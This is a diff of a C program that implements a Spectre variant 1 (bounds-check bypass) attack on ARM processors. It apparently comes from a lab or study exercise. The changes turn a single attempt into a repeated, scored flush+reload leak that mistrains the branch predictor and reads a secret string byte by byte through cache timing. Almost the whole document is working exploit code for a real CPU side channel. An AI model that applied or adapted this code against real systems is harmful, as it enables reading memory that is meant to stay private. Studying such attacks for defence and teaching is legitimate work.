@@ -4,129 +4,115 @@
 #include <string.h>
 #include <pthread.h>
 
-
+#define DELTA 1024
 volatile uint64_t counter = 0;
-unsigned int buffer_size = 10;
-u_int8_t buffer[100] = {0,1,2,3,4,5,6,7,8,9};
-u_int8_t temp = 0;
-char*secret = "Some Secret Value";
+unsigned int buffer_size = 16;
+u_int8_t buffer[16] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};
 u_int8_t array[256*4096];
-int thresh = 0;
-u_int8_t s = 0;
+char*secret = "This is a secret string";
+u_int8_t temp = 0;
 
-static inline void flush(void *addr) {
-	asm volatile ("DC CIVAC, %[ad]" : : [ad] "r" (addr));
-	asm volatile("DSB SY");
+static inline void flush(void *address) {
+	asm volatile ("DC CIVAC, %0" : : "r" (address)); //Cache line clear and invalidate based on virtual address
+	asm volatile("DSB SY"); // Barrier, forces the cache flush to complete before the barrier
 }
 
-void *inc_counter(void *a) {
+void *increment_counter(void *a) {
 	while (1) {
 		counter++;
-		asm volatile ("DMB SY");
+		asm volatile ("DMB SY"); // Memory barrier, forces the increment to complete
 	}
 }
 
-
-static u_int64_t timed_read(volatile uint8_t *addr) {
+static u_int64_t timed_read(volatile uint8_t *address) {
 	u_int64_t ns = counter;
-
 	asm volatile (
-		"DSB SY\n"
-		"LDR X5, [%[ad]]\n"
-		"DSB SY\n"
-		: : [ad] "r" (addr) : "x5");
-
+		"DSB SY\n" //memory barrier
+		"LDR X0, [%0]\n" // load into register x0, the value in [address]
+		"DSB SY\n" //memory barrier
+		: : "r" (address) : "x0"); // x0 is added to clobber list since its not an explicit output value
 	return counter - ns;
 }
 
-
-
-#define DELTA 1024
-
 void flushSideChannel()
 {
-  int i;// Write to array to bring it to RAM to prevent Copy-on-write
+  int i;
   for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
-  // Flush the values of the array from cache
   for (i = 0; i < 256; i++) flush(&array[i*4096 +DELTA]);
 }
 
 
-// Restricted access
-// Secret will be loaded due to speculative attack
 void victim(size_t x){
-  if (x < buffer_size){
-    //array[buffer[x]*4096 + DELTA] = 10;
-    s = buffer[x];
-    temp = array[s*4096 + DELTA]; 
-
-  } else {
-    return; 
-  }
+	if (x < buffer_size) {
+		temp &= array[buffer[x]*4096 + DELTA];
+	}
 }
 
-void reloadSideChannel(int thresh){
-  int junk=0;
-  register u_int64_t time;
-  volatile u_int8_t*addr;
-  int i;
-  for(i = 0; i < 256; i++){
-    time = timed_read(&array[i*4096 + DELTA]);
-    if (time <= thresh){
-      printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
-      printf("The Secret = %d.\n",i);
-    }
-  }
-}
-
-/*void spectre(size_t offset){
+void spectre(size_t offset){
   int i;
   u_int8_t s;
-  //Mistraining the branch predictor using valid values for x
-  for(int i = 0; i < 100; i++){
-    victim(i);
-  }
+	register u_int64_t time;
+	size_t training_x, x;
+	static int results[256];
+	for(i=0; i<256; i++){
+		results[i] = 0;
+	}
 
-  flush(&buffer_size);
-  flushSideChannel();
+	int tries;
+	int j;
+	for (tries = 999; tries > 0; tries--) {
+		flushSideChannel();
 
-  // Restricted access
-  // Secret will be loaded due to speculative attack
-  s = victim(offset);
-  array[s*4096 + DELTA] += 88; 
+		training_x = tries % buffer_size;
+		for (j = 29; j >= 0; j--) {
+			flush(&buffer_size);
+			for (volatile int z = 0; z < 100; z++)
+			{
+			} /* Delay (can also mfence) */
 
-  reloadSideChannel(thresh);
-}*/
+			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
+			/* Avoid jumps in case those tip off the branch predictor */
+			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
+			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
+			x = training_x ^ (x & (offset ^ training_x));
+
+			/* Call the victim! */
+			victim(x);
+		}
+		for(i = 0; i < 256; i++){
+	    time = timed_read(&array[i*4096 + DELTA]);
+	    if (time <= 10){
+	      results[i] += 1;
+	    }
+	  }
+	}
+	int max_value = 0;
+	int max_char = 0;
+	for(i=16; i<256; i++){
+		if(results[i] > max_value){
+			max_value = results[i];
+			max_char = i;
+		}
+	}
+	printf("Max. character = (%c, %d) \n", max_char, max_value);
+}
 
 int main(int argc, const char**argv){
-  thresh = atoi(argv[1]);
-  printf("Secet String Addr:   %p\n",(void*)&secret);
-  printf("Victim Buffer Addr:  %p\n",(void*)&buffer);
-  printf("Spectre Array Addr:  %p\n",(void*)&array);
-  pthread_t inc_counter_thread;
-	if (pthread_create(&inc_counter_thread, NULL, inc_counter, NULL)) {
-		fprintf(stderr, "Error creating thread\n");
-		return 1;
+  int thresh = atoi(argv[1]);
+
+  printf("Secret %p\n",(void*)&secret);
+  printf("Buffer %p\n",(void*)&buffer);
+  printf("Array %p\n",(void*)&array);
+
+  //Start the counter
+  pthread_t counter_thread;
+  pthread_create(&counter_thread, NULL, increment_counter, NULL);
+  while (counter < 100000000); //sleep
+  asm volatile ("DSB SY");
+
+  size_t secret_offset = (size_t)(secret - (char*)buffer);
+	for(int i=0; i<23; i++){
+  	spectre(secret_offset+i);
 	}
-	while (counter < 10000000);
-	asm volatile ("DSB SY");
-
-  // initialize buffer 
-  for(int i = 0; i < 100; i++){
-    buffer[i] = i;
-  }
-  size_t larger_x = (size_t)(secret - (char*)buffer);
-  //Mistraining the branch predictor using valid values for x
-  for(int i = 0; i < 100; i++){
-    flush(&buffer_size);
-    victim(i);
-  }
-
-  flush(&buffer_size);
-  flushSideChannel();
-
-  victim( larger_x );
-
-  reloadSideChannel(thresh);
   return (0);
 }
